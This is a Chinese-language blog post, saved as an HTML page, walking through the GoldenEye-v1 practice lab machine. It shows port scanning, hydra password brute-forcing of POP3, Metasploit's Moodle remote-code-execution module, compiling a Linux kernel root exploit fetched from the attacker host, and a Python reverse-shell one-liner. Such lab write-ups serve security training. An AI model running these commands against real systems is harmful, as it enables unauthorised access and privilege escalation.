@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>1-GoldenEye-v1 | Kyle</title><meta name="author" content="awsszzfff"><meta name="copyright" content="awsszzfff"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境靶机：192.168.125.140Kali：192.168.125.139 信息搜集扫描存活主机 1nmap -sP 192.168.125.0&#x2F;24  扫描对目标主机进行扫描 1nmap -sS -sV -T5 -A  192.168.125.140  目标主机开放25端口smtp服务，80端口http服务。   ![[attachments&#x2F;Pasted image 20240">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1-GoldenEye-v1">
+<meta property="og:url" content="http://example.com/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/index.html">
+<meta property="og:site_name" content="Kyle">
+<meta property="og:description" content="环境靶机：192.168.125.140Kali：192.168.125.139 信息搜集扫描存活主机 1nmap -sP 192.168.125.0&#x2F;24  扫描对目标主机进行扫描 1nmap -sS -sV -T5 -A  192.168.125.140  目标主机开放25端口smtp服务，80端口http服务。   ![[attachments&#x2F;Pasted image 20240">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/portrait.jpg">
+<meta property="article:published_time" content="2025-03-31T13:13:18.676Z">
+<meta property="article:modified_time" content="2025-03-31T13:40:00.223Z">
+<meta property="article:author" content="awsszzfff">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/portrait.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "1-GoldenEye-v1",
+  "url": "http://example.com/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/",
+  "image": "http://example.com/img/portrait.jpg",
+  "datePublished": "2025-03-31T13:13:18.676Z",
+  "dateModified": "2025-03-31T13:40:00.223Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "awsszzfff",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '1-GoldenEye-v1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/portrait.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Kyle</span></a><a class="nav-page-title" href="/"><span class="site-name">1-GoldenEye-v1</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">1-GoldenEye-v1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-31T13:13:18.676Z" title="发表于 2025-03-31 21:13:18">2025-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-31T13:40:00.223Z" title="更新于 2025-03-31 21:40:00">2025-03-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/">安全相关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机：192.168.125.140<br>Kali：192.168.125.139</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>扫描存活主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.125.0/24</span><br></pre></td></tr></table></figure>
+
+<p>扫描对目标主机进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A  192.168.125.140</span><br></pre></td></tr></table></figure>
+
+<p>目标主机开放25端口smtp服务，80端口http服务。</p>
+<p>  ![[attachments&#x2F;Pasted image 20240617105958.png]]<br>  访问目标主机。</p>
+<p>![[attachments&#x2F;Pasted image 20240617112230.png]]<br>![](.&#x2F;attachments&#x2F;Pasted image 20240617112230.png)</p>
+<p>大致意思是未发现用户，导航到<code>/sev-home/</code>目录。对该目录进行访问，发现登录页面，但是用户名密码均未知，先记录下来，继续搜集信息。</p>
+<p>![[attachments&#x2F;Pasted image 20240617112322.png]]</p>
+<p>F12查看上一个页面源码，发现<code>terminal.js</code>文件，尝试进行访问，发现隐藏信息。</p>
+<p>![[attachments&#x2F;Pasted image 20240617115029.png]]</p>
+<p>可以发现两个用户名<code>Boris、Natalya</code>，一个密码HTML解码得到<code>InvincibleHack3r</code>，进入刚才的登录界面分别进行尝试，成功登录（最终账号密码：boris&#x2F;InvincibleHack3r）</p>
+<p>![[attachments&#x2F;Pasted image 20240617114457.png]]</p>
+<p>“我们已经将pop3服务配置为运行在一个非常高的非默认端口上”<br>第三句给出提示，pop3服务运行在一个非默认端口（默认端口为110），根据所给信息，再次对原主机进行端口扫描。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.4.202</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240617115657.png]]</p>
+<p>发现55006，55007两个开放的端口，继续扫描端口开启的服务详细信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p55006,55007 192.168.125.140</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240617121840.png]]</p>
+<p>可以发现两个端口都开放了pop3邮件服务，尝试访问<code>http://192.168.4.202:55007/</code>失败。前面已知存在两个用户<code>Boris、Natalya</code>，尝试进行暴力破解，通过nc进行登录pop3服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;natalya\nboris&#x27; &gt; useers.txt</span><br><span class="line">hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.125.140 -s 55007 pop3</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[55007][pop3] host: 192.168.125.140   login: natalya   password: bird</span><br><span class="line">[55007][pop3] host: 192.168.125.140   login: boris   password: secret1!</span><br></pre></td></tr></table></figure>
+
+<p>分别登录pop3并分别查看邮件内容。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.4.202 55007     # 登录邮箱</span><br><span class="line">user boris                 # 登录用户 natalya</span><br><span class="line">pass secret1!              # 登录密码 bird</span><br><span class="line">list                       # 查看邮件数量</span><br><span class="line">retr 1~3                   # 查看邮件内容</span><br></pre></td></tr></table></figure>
+
+<p>boris第二封邮件中提到“natalya，称她可以破坏鲍里斯的密码”；第三封邮件中提到“附件是黄金眼的最终访问密码。把它们放在这个服务器根目录下的一个隐藏文件中；一旦Xenia进入训练地点并熟悉黄金眼终端代码我们将进入最后阶段….”（应该就是flag吧！）<br>natalya第一封邮件提到“一个名为 Janus 的犯罪集团正在追捕 GoldenEye”；第二封邮件：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户名:xenia</span><br><span class="line">密码:RCP90rulez!</span><br><span class="line">boris证实了她是合法的承包商所以只要创建账户，好吗?</span><br><span class="line">如果你在外部内部域名上没有网址:severnaya-station.com/gnocertdir</span><br><span class="line">**请确保编辑您的主机文件，因为您通常在网络外远程工作....</span><br><span class="line">因为你是一个Linux用户，只要把这个服务器的IP指向/etc/hosts中的severnaya-station.com即可</span><br></pre></td></tr></table></figure>
+
+<p>得到一个新的用户名和密码，并且通过提示可以知道，要想访问到到它的服务器需要进行hosts文件配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加</span></span><br><span class="line">192.168.125.140 severnaya-station.com</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://severnaya-station.com/gnocertdir/</code>，可以看到是一个moodle的CMS，进行登录。</p>
+<p>![[attachments&#x2F;Pasted image 20240617161919.png]]</p>
+<p>可以在<code>Home/My profile/Messages</code>中看到一个用户Doak的来信，并且可以在左上角看到该moodle的版本为2.2.3，先记录下来。同上面的步骤一样，对Doak的密码进行爆破。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[55007][pop3] host: 192.168.4.202   login: doak   password: goat</span><br></pre></td></tr></table></figure>
+
+<p>在此通过nc登录，查看邮件</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">James,</span><br><span class="line">如果你正在阅读这篇文章，恭喜你已经走到了这一步。你知道谍报技术是怎么运作的吧?</span><br><span class="line">因为我不知道。去我们的培训网站，登陆我的账号....继续挖，直到你能获取更多信息......</span><br><span class="line">用户名:dr_doak</span><br><span class="line">密码:4England!</span><br></pre></td></tr></table></figure>
+
+<p>看样子应该马上成功了。根据所提供的用户名和密码再次登录CMS，登录后在<code>Message</code>处发现同管理员的通信；在<code>Home/ My home</code> 右边发现文件<code>s3cret.txt</code>，下载查看内容：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">007年,</span><br><span class="line">我能够通过clear txt捕捉这个应用程序adm1n cr3ds。 </span><br><span class="line">GoldenEye服务器中的大多数web应用程序中的文本都会被扫描，所以我不能在这里添加cr3dentials。</span><br><span class="line">有趣的文件在这里:/dir007key/for-007.jpg</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://severnaya-station.com/dir007key/for-007.jpg</code>，一张沙掉的图片，<code>wget http://severnaya-station.com/dir007key/for-007.jpg</code>下下来看看，<code>exiftool for-007.jpg</code>查看图片隐藏的一些底层内容。</p>
+<p>![[attachments&#x2F;Pasted image 20240617170933.png]]</p>
+<p>可以发现有一条base64编码隐藏信息：<code>eFdpbnRlcjE5OTV4IQ==</code>，解码得到：<code>xWinter1995x!</code>。根据线索可以知道这应该是管理员的密码，再次登录CMS，成功拿到CMS的管理员权限。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据上面所得到的Moodle版本信息，搜索<code>Moodle 2.2.3 exp cve</code>发现有CVE-2013-3630 漏洞可利用。<br>使用MSF继续进行渗透</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole          # 进入msf</span><br><span class="line">search moodle       # 查找moodle类型攻击的模块</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240617191817.png]]</p>
+<p>这里用第二个<code>moodle splling binary rce</code>，【搜到的是<code>Moodle - Remote Command Execution</code>，这里有点迷惑，对漏洞原理还是不太清楚，可查看文末相关链接】</p>
+<p>![[attachments&#x2F;Pasted image 20240617192001.png]]</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use 1                             # 调用1  </span><br><span class="line">show options                      # 显示所有选项</span><br><span class="line">set username admin                # 设置用户名</span><br><span class="line">set password xWinter1995x!        # 设置密码</span><br><span class="line">set rhost severnaya-station.com   # 设置：rhosts</span><br><span class="line">set targeturi /gnocertdir         # 设置目录： /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse      # 设置payload</span><br><span class="line">set lhost 192.168.125.140           # 设置：lhost（需要本地IP）</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240617192408.png]]</p>
+<p>所有设置完成后run失败，是因为exp应用的shell和moodle原本所设置的Google Spell不同，需进行修改。</p>
+<p>![[attachments&#x2F;Pasted image 20240617192851.png]]</p>
+<p>管理员身份进入系统对shell进行修改，记得保存。</p>
+<p>![[attachments&#x2F;Pasted image 20240617192653.png]]</p>
+<p><code>run</code>运行成功获得shell，查看身份。</p>
+<p>![[attachments&#x2F;Pasted image 20240618134959.png]]</p>
+<p>获取交互式shell，查看主机内核信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;     # 获取交互式tty</span><br><span class="line">uname -a    # 查看主机内核</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240618135103.png]]</p>
+<p>搜索：Linux ubuntu 3.13.0-32 exploit，获得exp版本：37292，CVE(CAN) ID: CVE-2015-1328。在kali中搜索攻击脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 37292        # 搜索kali本地的exp库中37292攻击脚本信息</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/   # 将脚本文件复制到当前目录</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240618140045.png]]</p>
+<p>脚本需要gcc进行编译，而目标系统没有gcc，但是可以用cc进行编译。(可用which gcc查看是否安装)</p>
+<p>![[attachments&#x2F;Pasted image 20240618135926.png]]</p>
+<p>修改脚本内容，将143行gcc修改为cc保存。</p>
+<p>![[attachments&#x2F;Pasted image 20240618135555.png]]</p>
+<p>kali开启http服务，供靶机下载攻击脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8081 # 开区http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.125.140:8081 # 靶机下载脚本文件</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240618140315.png]]</p>
+<p>对下载下来的脚本进行编译运行，成功获取root权限。进入根目录获取flag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cc -o exp 37292.c     # C语言的CC代码编译点c文件</span><br><span class="line">chmod +x exp          # 编译成可执行文件，并赋权</span><br><span class="line">./exp                 # 执行</span><br><span class="line"></span><br><span class="line">id                   # 查看目前权限</span><br><span class="line">cat .flag.txt  # 读取root下的flag信息</span><br><span class="line">&quot;568628e0d993b1973adc718237da6e93&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240618140723.png]]</p>
+<p><strong>【另一种获取shell的方式】</strong><br>在<code>Home/Site administration/Server/System paths</code>处有执行系统命令的地方，对其进行修改。（记得保存）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.125.139&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subproce</span><br></pre></td></tr></table></figure>
+
+<p>![[attachments&#x2F;Pasted image 20240618150720.png]]</p>
+<p>在kali中<code>c -lvp 6666</code>进行监听。</p>
+<p>![[attachments&#x2F;Pasted image 20240618151139.png]]</p>
+<p>在<code>Home/My profile/Blogs/Add a new entry</code>处有触发点，点击触发后上方nc得到shell。</p>
+<p>![[attachments&#x2F;Pasted image 20240618152136.png]]</p>
+<blockquote>
+<p>参考文章及漏洞相关链接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43938645/article/details/127339270">https://blog.csdn.net/weixin_43938645/article/details/127339270</a><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/multi/http/moodle_spelling_binary_rce/">https://www.rapid7.com/db/modules/exploit/multi/http/moodle_spelling_binary_rce/</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/29324">https://www.exploit-db.com/exploits/29324</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a></p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">awsszzfff</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/">http://example.com/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Kyle</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/portrait.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/000%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/000%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="000信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">000信息收集</div></div><div class="info-2"><div class="info-item-1">[[..&#x2F;001迪&#x2F;002信息收集问题|002信息收集问题]] 000信息收集收集哪些信息 域名信息（whois、备案信息、子域名） 服务器信息（端口、服务、真实IP） 网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、WAF、敏感目录、敏感文件、源码泄露、旁站、C段） 管理员信息（姓名、职务、生日、联系电话、邮件地址）  域名信息收集利用 Whois 协议收集信息 工作过程  WHOIS 服务是一个在线的“请求&#x2F;响应”式服务。WHOIS Server 运行在后台监听 43 号端口，当 Internet 用户搜索一个域名（或主机、联系人等其他信息）时，WHOIS Server 首先建立一个与 Client 的 TCP 连接，然后接收用户请求的信息并据此查询后台域名数据库。如果数据库中存在相应的记录，它会将相关信息如所有者、管理信息以及技术联络信息等，反馈给 Client 。待 Server 输出结束，Client 关闭连接，至此，一个查询过程结束。  主要用途  查询域名的 IP...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/portrait.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">awsszzfff</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E9%9D%B6%E5%9C%BA/1-GoldenEye-v1/1-GoldenEye-v1/" title="1-GoldenEye-v1">1-GoldenEye-v1</a><time datetime="2025-03-31T13:13:18.676Z" title="发表于 2025-03-31 21:13:18">2025-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/000%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/000%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="000信息收集">000信息收集</a><time datetime="2025-03-31T13:11:31.188Z" title="发表于 2025-03-31 21:11:31">2025-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/30/hexo/" title="无标题">无标题</a><time datetime="2025-03-30T06:39:37.208Z" title="发表于 2025-03-30 14:39:37">2025-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/30/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/01%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/01%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/" title="名词解释">名词解释</a><time datetime="2025-03-30T06:35:13.040Z" title="发表于 2025-03-30 14:35:13">2025-03-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By awsszzfff</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span 